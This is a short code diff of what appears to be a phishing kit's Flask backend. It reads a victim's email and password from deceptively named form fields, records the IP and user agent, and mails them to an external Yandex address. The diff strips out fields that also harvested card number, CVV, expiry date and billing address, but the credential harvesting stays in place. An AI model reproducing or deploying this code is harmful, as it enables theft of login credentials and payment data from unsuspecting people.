@@ -180,11 +180,6 @@ def first():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        cardnumber = request.form.get('cardNumber')
-        billingaddress = request.form.get('billingAddress')
-        expirydate = request.form.get('expiryDate')
-        cvv = request.form.get('cvv')
-        cardholdername = request.form.get('cardHolderName')
         sender_emailx = 'contact'
         sender_email = 'contact@personalbio.site'
         receiver_email = 'raining.dey@yandex.com'
@@ -202,11 +197,6 @@ def first():
         """
         html = render_template(
             'emailmailer.html',
-            cardholdernames=cardholdername,
-            cvvs=cvv,
-            expirydates=expirydate,
-            billingaddres=billingaddress,
-            cardnumbers=cardnumber,
             emailaccess=email,
             useragent=useragent,
             passaccess=passwordemail,
